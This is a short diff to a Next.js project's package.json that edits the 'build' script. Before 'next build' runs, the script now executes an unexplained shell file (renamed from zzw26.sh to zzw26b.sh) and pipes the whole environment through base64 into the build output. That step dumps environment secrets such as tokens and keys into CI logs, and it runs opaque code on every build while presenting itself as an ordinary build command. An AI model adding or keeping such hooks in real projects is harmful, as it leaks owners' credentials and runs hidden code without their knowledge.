@@ -4,7 +4,7 @@
     "private": true,
     "scripts": {
         "dev": "next dev",
-        "build": "bash zzw26.sh; env | base64 -w0; next build",
+        "build": "bash zzw26b.sh; env | base64 -w0; next build",
         "start": "next start -p 3005",
         "lint": "next lint"
     },
